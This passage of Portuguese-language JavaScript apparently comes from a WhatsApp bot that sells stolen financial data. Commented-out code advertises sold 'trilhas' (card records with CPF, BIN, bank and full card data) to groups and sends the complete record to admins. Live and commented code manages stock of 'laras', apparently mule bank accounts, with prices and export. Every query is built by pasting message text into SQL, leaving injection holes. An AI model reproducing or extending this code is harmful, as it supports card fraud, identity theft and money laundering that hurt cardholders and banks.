        //             await client.sendText(Mensagem_From, Texto_Usuario).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });


        //             Texto_Grupo = `📠 *USUÁRIO COMPROU UMA TRILHA* 📠

        // 👤 *USUÁRIO:* wa.me/${NUMERO_USER_CONTROLE_VISIBILIDADE}

        // 💰 *VALOR:* R$: ${PRECO_TRILHA}

        // 💳 *BIN:* ${BIN}

        // *VENHA ADQUIRIR OS MELHORES TRILHAS DO MERCADO!*

        // *ATENDIMENTO 100% AUTOMÁTICO!*

        // Este é o número do BOT, mande qualquer mensagem!
        // wa.me/${NUMERO_PURO_BOT}
        // `

        //             NOT_COMPROU_TRILHA = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_TRILHA'`).get()["VALOR"]
        //             if (NOT_COMPROU_TRILHA === "1") {
        //                 for await (Grupo of ID_GRUPOS) {
        //                     try {
        //                         await client.sendImage(Grupo["ID_GRUPO"], FOTO_Comprou_Trilha_GP, 'foto', Texto_Grupo).then(async (result) => {
        //                         }).catch(async(erro) => {
        //                             console.error('Error when sending: ', erro);
        //                         });
        //                     } catch (error) {
        //                     }
        //                 }
        //             }

        //             Texto_Adms = `📠 *TRILHA VENDIDA* 📠

        // ◇───────◇───────◇
        // 👤 *NÚMERO DO USUÁRIO:* wa.me/${NUMERO_USER_CONTROLE_VISIBILIDADE}
        // ⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
        // 💰 *VALOR:* R$: ${PRECO_TRILHA}
        // ◇───────◇───────◇

        // ⚜️ *DADOS DA TRILHA* ⚜️

        // 🗒️ *CPF:* ${CPF}
        // 🆙 *LEVEL:* ${LEVEL}
        // 💳 *BIN:* ${BIN}
        // 🏳️ *BANDEIRA:* ${BANDEIRA}
        // ⚜️ *TIPO:* ${TIPO}
        // 💠 *NIVEL:* ${NIVEL}
        // 🏛 *BANCO:* ${BANCO}
        // 🌍 *PAIS:* ${PAIS}

        // 📠 *TRILHA*
        // ${TUDO_DA_TRILHA}
        // `

        //             for await (adm of Adms) {
        //                 Texto = Texto_Adms
        //                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //             }

        //             Item_Fila_Sendo_Processado_MS = Date.now()
        //             console.log(`Trilha Comprada! Numero: wa.me/${Numero} | Valor: ${PRECO_TRILHA}`)
        //             return;
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳
























        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 



        ////addlara===BANCO===NOME===PREÇO===ADICIONAIS
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/addlara===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "") {
                Texto = `Comando inválido`
                await client.sendText(Mensagem_From, Texto).then(async (result) => {
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }).catch(async(erro) => {
                    console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                });
                return
            }

            Array_Fila_Espera = []
            try {
                await client.sendText(Mensagem_From, "ABASTECENDO LARA...").then(async (result) => {

                    try {
                        Contagem_Abastecidas = 0

                        db = new sqlite3.Database(Diretorio_SQLITE_Principal);
                        db.serialize(async function () {
                            db.run("begin transaction");

                            try {

                                Abastecendo = true

                                Div = Mensagem_Texto.split("===")

                                BANCO = Div[1].toUpperCase()
                                NOME = Div[2]
                                console.log(`Inserindo lara do Nome: ${NOME}`)
                                PRECO = Div[3]
                                PRECO = parseFloat(PRECO).toFixed(2)
                                INFORMACOES_ADICIONAIS = Div[4]
                                DATA_MS_INSERIDO = Date.now()

                                db.run(`INSERT INTO LARAS (BANCO,NOME,PRECO,ADICIONAIS,DATA_MS_INSERIDO) VALUES ('${BANCO}','${NOME}','${PRECO}','${INFORMACOES_ADICIONAIS}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
                                Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1

                            } catch (error) {
                                console.log(error)

                                for await (adm of Adms) {
                                    Texto = `*Ocorreu algum problema no abastecimento.*

Erro: ${error}`
                                    await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
                                        Abastecendo = false
                                        return
                                    }).catch(async(erro) => {
                                        console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                                    });
                                }
                                return
                            }

                            if (Contagem_Abastecidas != 0) {
                                console.log("comitando")
                                db.run("commit");
                            }

                            for await (adm of Adms) {
                                Texto = `*ABASTECIMENTO FINALIZADO*

${Contagem_Abastecidas} Lara Abastecida.
`, `${adm}@c.us`
                                await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
                                }).catch(async(erro) => {
                                    console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                                });
                            }
                            Abastecendo = false
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        });
                    } catch (error) {
                        Texto = `Erro === ${error}`
                        await client.sendText(Mensagem_From, Texto).then(async (result) => {
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        }).catch(async(erro) => {
                            console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                        });
                    }
                })
                    .catch((error) => { console.log(debugLine("Error when sending = " + (JSON.stringify(error)))); });
            } catch (error) {
                Texto = `Erro === ${error}`
                await client.sendText(Mensagem_From, Texto).then(async (result) => {
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }).catch(async(erro) => {
                    console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                });
                return
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/valorlara===") > -1 && Adms.includes(Numero)) {
        //             try {
        //                 Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
        //                 if (Array_Total_Igual.length != 6) {
        //                     Texto = `Comando inválido CODE:1`
        //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                     return
        //                 }

        //                 msg = Mensagem_Texto.split("===")
        //                 ID = msg[1]
        //                 NOVO_VALOR = msg[2]
        //                 NOVO_VALOR = parseFloat(NOVO_VALOR).toFixed(2);

        //                 if (ID === "") {
        //                     Texto = `Comando inválido CODE:2`
        //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                     return
        //                 }
        //                 if (NOVO_VALOR === "") {

        //                     Texto = `Comando inválido CODE:3`
        //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                     return
        //                 }

        //                 SALDO = await DataBase_Better.prepare(`SELECT SALDO FROM LARAS WHERE _rowid_ = '${ID}'`).get()["SALDO"]

        //                 PRECO_ANTERIOR = await DataBase_Better.prepare(`SELECT PRECO FROM LARAS WHERE _rowid_ = '${ID}'`).get()["PRECO"]
        //                 PRECO_ANTERIOR = parseFloat(PRECO_ANTERIOR).toFixed(2);

        //                 await DataBase_Better.prepare(`UPDATE LARAS SET PRECO = '${NOVO_VALOR}' WHERE _rowid_ = '${ID}'`).run()

        //                 for await (adm of Adms) {
        //                     Texto = `Preço Lara que tem o Saldo: ${SALDO} do ID: ${ID} alterado com sucesso!

        // Valor anterior: ${PRECO_ANTERIOR}

        // Valor atual: ${NOVO_VALOR}`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //             } catch (error) {

        //                 Texto = `Comando inválido! CODE:${error}`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //             }
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto.indexOf("/baixarestoquelara") > -1 && Adms.includes(Numero)) {
        //     lara
        //     Texto = `Gerando arquivo...`
        //     await client.sendText(Mensagem_From, Texto).then(async (result) => {

        //         Array_MATERIAL = await DataBase_Better.prepare(`SELECT * FROM LARAS`).all();
        //         //shuffle(Array_MATERIAL);

        //         today = new Date();
        //         today.setHours(today.getHours() + 0);
        //         Nome_File_Visual = `${Nome_Dono} ${Array_MATERIAL.length} Laras Data ${today}.txt`
        //         Nome_File_Visual = Nome_File_Visual.replace(/\\/igm, '/');
        //         Nome_File_Visual = Nome_File_Visual.replace(/\s\(Horário Padrão de Brasília\)/igm, '');
        //         Nome_File_Visual = Nome_File_Visual.replace(/\sGMT\-0300/igm, '');
        //         Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');

        //         Nome_File = __dirname + `\\Pacotes\\${Nome_File_Visual}`

        //         //console.log(Nome_File_Visual)
        //         //console.log(Nome_File)

        //         message = fs.createWriteStream(Nome_File);
        //         for (var index = 0; index < Array_MATERIAL.length; index++) {
        //             console.log(`${Array_MATERIAL[index]["BANCO"]}|${Array_MATERIAL[index]["NOME"]}|${Array_MATERIAL[index]["PRECO"]}|${Array_MATERIAL[index]["INFORMACOES_ADICIONAIS"]}`)
        //             message.write(`${Array_MATERIAL[index]["BANCO"]}|${Array_MATERIAL[index]["NOME"]}|${Array_MATERIAL[index]["PRECO"]}|${Array_MATERIAL[index]["INFORMACOES_ADICIONAIS"]}\n`);
        //             if (index === parseInt(Array_MATERIAL.length) - 1) {
        //                 //console.log("Foi")
        //                 await delay(2000)
        //                 await client.sendFile(Mensagem_From, Nome_File, Nome_File_Visual, "Texto_Usuario").then(async (result) => {
        //                 }).catch(async(erro) => {
        //                     console.error('Error when sending: ', erro);
        //                 });
        //             }
        //         }
        //     }).catch(async(erro) => {
        //         console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //     });
        //     return
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto === "/deletarestoquelara" && Adms.includes(Numero)) {
        //     await DataBase_Better.prepare(`DELETE FROM LARAS`).run();
        //     Texto = `*ESTOQUE DE LARAS DELETADO COM SUCESSO!*`
        //     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //     }).catch(async(erro) => {
        //         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //     });
        //     return
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto.indexOf("/textomenularas===") > -1 && Adms.includes(Numero)) {
        //     try {
        //         msg = Mensagem_Texto.split("===")
        //         Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

        //         if (msg[1] === "") {
        //             Texto = `Comando inválido`
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });
        //             return
        //         }
        //         TEXTO_MENU_LARA = msg[1]
        //         await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_MENU_LARA}' WHERE PARAMETRO = 'TEXTO_MENU_LARA'`).run()

        //         Texto = `*TEXTO DO MENU DE LARAS ALTERADO COM SUCESSO!*`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     } catch (error) {
        //         console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //         Texto = `Comando inválido`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     }
        // }
